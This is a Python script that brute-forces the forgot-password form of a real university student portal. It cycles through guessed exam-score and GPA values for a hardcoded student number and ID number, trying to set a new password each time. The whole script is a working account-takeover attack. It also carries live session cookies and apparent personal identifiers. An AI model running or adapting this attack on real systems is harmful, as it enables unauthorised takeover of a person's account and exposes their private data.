import requests


url = "https://zajelbs.najah.edu/servlet/signin_frgt"
headers = {
    "Host": "zajelbs.najah.edu",
    "Cookie": "JSESSIONID=s06~55E5B6BEB110344F1FE9012B51B1BEAC.tomcat2; _ga_QHQT49TPWM=GS1.1.1725884368.1.0.1725884375.0.0.0; _ga=GA1.2.103658214.1725884368; _ga_WZ87130T4C=GS1.1.1729373263.13.1.1729375295.0.0.0; cf_clearance=VZWBLmp5cTjuSntqBoL1blbJkAyy5bFwbxvqP4OIGoM-1729372072-1.2.1.1-kb8wRKgDS9FCBqSQzQK0Hd3cvYkl6fToQxW.WuK4y5z4iwQfeO35hqdFkXKmt_G4_7vYl8JL.6QAcUSNS_7oUiLkcZrMQx0vrb1NYvnTyfgZ6bWWgGmTT7RSMDwBbDTXYZttRnTnP_vfb.spwKYd5hZqX0yD8HEUlqtVU_xzkggD7_VBcpMWCcmnBS2wzVnfPN_Fz4mdJPJjXpr_BQGwuqPgKvnGyUkEgKGFzaCJquvwUGceb4kRsKBuDQa6j_KIIAoBCWd8EPNRkRJChnDuJLwnLV0binQUAj_ty7TD2VTN3iAaBfI8uiXtW_PYIGq9qHOMjgNH20jAr.D.5PVFFTkDD6gbf5FBbLbCVayUl1lt4ehNXokgfjODFadsMni4; _gid=GA1.2.149692464.1729373264",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://zajelbs.najah.edu",
    "Referer": "https://zajelbs.najah.edu/servlet/TestStuNum_frgt",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Te": "trailers",
    "Connection": "keep-alive"
}


data_template = {
    "stu1": "12323069",
    "pas1": "12323069new",
    "pas2": "12323069new",
    "ide": "420548380",
    "taw": None,  
    "acc": None,  
    "passqst": ""
}


for taw in range(950, 1001, 1):  
    for acc in range(350, 401, 1):  
       
        taw_value = taw / 10.0
        acc_value = acc / 100.0

       
        data_template["taw"] = str(taw_value)
        data_template["acc"] = str(acc_value)

        # Send POST request
        response = requests.post(url, headers=headers, data=data_template)

        
        print(f"taw: {taw_value}, acc: {acc_value}, Status Code: {response.status_code}")
        num_chars = len(response.text)
        print(f"Number of characters in the response: {num_chars}")

